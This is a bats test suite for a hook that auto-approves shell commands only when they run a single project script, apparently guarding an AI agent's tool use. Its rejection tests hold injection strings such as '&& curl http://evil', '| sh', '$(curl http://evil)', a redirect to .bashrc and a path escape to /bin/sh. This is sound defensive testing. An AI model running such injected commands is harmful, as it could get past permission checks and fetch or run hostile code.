#!/usr/bin/env bats
#
# The hook approves the whole command string, so it must approve only
# commands that run exactly one thing.

load test_helper

setup() {
    setup_content_dir
    HOOK="$SCRIPTS/pretool-allow"
}
teardown() { teardown_content_dir; }

# decide - Run the hook against a command; prints its stdout.
decide() {
    printf '{"tool_input":{"command":%s}}' "$(printf '%s' "$1" | jq -Rs .)" \
        | "$HOOK"
}

@test "approves a bare script invocation" {
    run decide "$SCRIPTS/status"
    [[ "$output" == *'"permissionDecision":"allow"'* ]]
}

@test "approves a script with quoted arguments" {
    run decide "$SCRIPTS/observe --title \"NAS restart order\" --body \"Traefik first\""
    [[ "$output" == *'"allow"'* ]]
}

@test "approves an argument containing operator characters inside quotes" {
    run decide "$SCRIPTS/observe --title 'A' --body 'run make check && make test; then ship'"
    [[ "$output" == *'"allow"'* ]]
}

@test "rejects a command chained with a semicolon" {
    run decide "$SCRIPTS/status; echo pwned"
    [[ -z "$output" ]]
}

@test "rejects a command chained with &&" {
    run decide "$SCRIPTS/status && curl http://evil"
    [[ -z "$output" ]]
}

@test "rejects a pipeline" {
    run decide "$SCRIPTS/status | sh"
    [[ -z "$output" ]]
}

@test "rejects command substitution in an argument" {
    run decide "$SCRIPTS/observe --title \$(curl http://evil) --body x"
    [[ -z "$output" ]]
}

@test "rejects command substitution inside double quotes" {
    run decide "$SCRIPTS/observe --title \"\$(curl http://evil)\" --body x"
    [[ -z "$output" ]]
}

@test "rejects backtick substitution" {
    run decide "$SCRIPTS/status \`id\`"
    [[ -z "$output" ]]
}

@test "rejects redirection" {
    run decide "$SCRIPTS/status > /home/user/.bashrc"
    [[ -z "$output" ]]
}

@test "rejects a background ampersand" {
    run decide "$SCRIPTS/status & echo done"
    [[ -z "$output" ]]
}

@test "rejects a newline-separated second command" {
    run decide "$SCRIPTS/status
echo pwned"
    [[ -z "$output" ]]
}

@test "rejects an unterminated quote" {
    run decide "$SCRIPTS/observe --title 'unclosed"
    [[ -z "$output" ]]
}

@test "rejects a command that is not one of our scripts" {
    run decide "/bin/echo hello"
    [[ -z "$output" ]]
}

@test "rejects a path that resolves out of the scripts directory" {
    run decide "$SCRIPTS/../scripts/../../bin/sh"
    [[ -z "$output" ]]
}

@test "rejects a nonexistent script in the scripts directory" {
    run decide "$SCRIPTS/no-such-script --flag"
    [[ -z "$output" ]]
}

@test "ignores input with no command" {
    run bash -c "printf '{}' | $HOOK"
    [[ -z "$output" ]]
}
